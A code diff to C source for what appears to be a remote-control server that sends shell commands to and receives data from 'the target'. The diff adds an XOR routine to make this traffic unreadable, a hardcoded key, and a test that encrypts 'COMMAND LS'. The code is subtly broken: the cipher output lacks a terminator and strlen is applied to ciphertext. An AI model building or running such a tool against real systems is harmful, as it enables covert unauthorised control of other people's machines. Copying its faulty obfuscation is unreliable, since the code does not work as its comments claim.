@@ -12,8 +12,34 @@
 #define SHELL "s"
 #define EXIT "e"
 
+#define NOTKEY "thisisdefientleynothekey"
+
 #define MAX 1024
 
+// This is how we make our data unreadable. It is using a simple
+// XOR to encrypt any data
+char* whatdoido(char *data, char *key, int dataLen, int keylen){
+    char *output = (char *)malloc(sizeof(char) * dataLen);
+
+    for (int i = 0; i < dataLen; i++) {
+        /* code */
+        output[i] = data[i] ^ key[i % keylen];
+    }
+
+    return output;
+}
+
+// Test code
+void testCrypto(){
+    char *plaintext = "COMMAND LS";
+    char *ciphertext = whatdoido(plaintext, NOTKEY, strlen(plaintext), strlen(NOTKEY));
+    printf("The cipher is %s\n", ciphertext);
+    char *reverse = whatdoido(ciphertext, NOTKEY, strlen(ciphertext), strlen(NOTKEY));
+    printf("The plaintext is %s\n", reverse);
+}
+
+// This function will the brain. It will send and receive data
+// from the target.
 void yay_connection(int sockfd){
 
     char buf[MAX];
@@ -97,7 +123,5 @@ int main(){
     yay_connection(connfd);
 
     close(sockfd);
-
-    // Wait for clients and spawn a new thread 
 
 }
